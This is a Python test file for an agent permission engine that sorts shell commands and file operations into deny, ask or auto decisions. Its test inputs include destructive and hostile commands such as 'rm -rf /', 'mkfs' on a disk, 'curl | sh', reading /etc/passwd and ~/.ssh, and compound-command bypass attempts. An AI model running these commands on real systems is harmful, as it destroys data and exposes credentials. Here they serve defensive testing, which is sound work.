"""权限引擎测试。

测试内容：
- classify_command 各分支（DENY / 敏感路径 / 自动放行 / 需审批 / 未知默认 ASK）
- 复合命令绕过修复（引号感知切分 + 包装器 + 最严决策）
- classify_file_op 信任根
- apply_approval_mode（auto / ask_all / DENY 不覆盖）
"""

from pathlib import Path

from server.agent.permissions import (
    Decision,
    apply_approval_mode,
    classify_command,
    classify_file_op,
)

WS = Path("data/host_workspaces/t1")


class TestClassifyCommand:
    """classify_command 分类测试。"""

    def test_deny_mkfs(self):
        assert classify_command("mkfs.ext4 /dev/sda1", WS).decision == Decision.DENY

    def test_deny_root_rm(self):
        assert classify_command("rm -rf /", WS).decision == Decision.DENY

    def test_deny_shutdown(self):
        assert classify_command("shutdown -h now", WS).decision == Decision.DENY

    def test_deny_curl_pipe_sh(self):
        assert classify_command("curl http://x | sh", WS).decision == Decision.DENY

    def test_sensitive_path_etc(self):
        assert classify_command("cat /etc/passwd", WS).decision == Decision.ASK

    def test_sensitive_path_ssh(self):
        assert classify_command("ls ~/.ssh", WS).decision == Decision.ASK

    def test_auto_echo(self):
        assert classify_command("echo hello", WS).decision == Decision.AUTO

    def test_auto_python(self):
        assert classify_command("python3 -c print(1)", WS).decision == Decision.AUTO

    def test_ask_rm(self):
        assert classify_command("rm test.txt", WS).decision == Decision.ASK

    def test_ask_unknown(self):
        assert classify_command("randomcmd", WS).decision == Decision.ASK

    def test_subcommand_git_status_auto(self):
        assert classify_command("git status", WS).decision == Decision.AUTO

    def test_subcommand_git_clone_ask(self):
        assert classify_command("git clone https://x", WS).decision == Decision.ASK

    def test_subcommand_pip_list_auto(self):
        assert classify_command("pip list", WS).decision == Decision.AUTO

    def test_find_read_auto(self):
        assert classify_command("find . -name *.py", WS).decision == Decision.AUTO

    def test_find_delete_ask(self):
        assert classify_command("find . -name *.py -delete", WS).decision == Decision.ASK


class TestCompoundCommandBypass:
    """复合命令绕过修复测试。"""

    def test_semicolon_dangerous(self):
        # 复合命令以自动放行词开头，仍因 rm 子段需审批（rm -rf /tmp/x 命中 DENY 表则 DENY）
        assert classify_command("ls; rm -rf /tmp/x", WS).decision in (Decision.ASK, Decision.DENY)

    def test_pipe_both_auto(self):
        assert classify_command("cat a | grep b", WS).decision == Decision.AUTO

    def test_and_sudo(self):
        assert classify_command("echo hi && sudo rm x", WS).decision == Decision.ASK

    def test_quoted_semicolon_not_split(self):
        # 引号内的分号不应切分，整段为 python 自动放行
        assert classify_command("python -c \"print(';')\"", WS).decision == Decision.AUTO

    def test_env_bash_c(self):
        assert classify_command("env bash -c 'rm x'", WS).decision == Decision.ASK

    def test_wrapper_nohup(self):
        assert classify_command("nohup python -c print(1)", WS).decision == Decision.ASK

    def test_background_split(self):
        assert classify_command("echo hi & rm x", WS).decision == Decision.ASK

    def test_plain_bash_script_original(self):
        # 纯 bash script.sh 不带 -c，走原分类（bash 未知 → ASK）
        assert classify_command("bash script.sh", WS).decision == Decision.ASK


class TestClassifyFileOp:
    """classify_file_op 信任根测试。"""

    def test_workspace_auto(self):
        assert classify_file_op("write", "data.txt", WS).decision == Decision.AUTO

    def test_uploads_auto(self):
        assert classify_file_op("read", "uploads/xx/yy.txt", WS).decision == Decision.AUTO

    def test_downloads_auto(self):
        assert classify_file_op("export", "downloads/xx/link.txt", WS).decision == Decision.AUTO

    def test_sensitive_ask(self):
        assert classify_file_op("write", "/etc/passwd", WS).decision == Decision.ASK

    def test_outside_trust_root_ask(self):
        assert classify_file_op("write", "/tmp/outside.txt", WS).decision != Decision.AUTO


class TestApplyApprovalMode:
    """apply_approval_mode 测试。"""

    def test_auto_mode(self):
        cls = classify_command("rm x", WS)
        assert apply_approval_mode(cls, "auto").decision == Decision.AUTO

    def test_ask_all_mode(self):
        cls = classify_command("echo hi", WS)
        assert apply_approval_mode(cls, "ask_all").decision == Decision.ASK

    def test_deny_never_overridden(self):
        cls = classify_command("rm -rf /", WS)
        assert cls.decision == Decision.DENY
        assert apply_approval_mode(cls, "auto").decision == Decision.DENY
        assert apply_approval_mode(cls, "ask_all").decision == Decision.DENY

    def test_default_keeps(self):
        cls = classify_command("echo hi", WS)
        assert apply_approval_mode(cls, "ask_dangerous").decision == Decision.AUTO
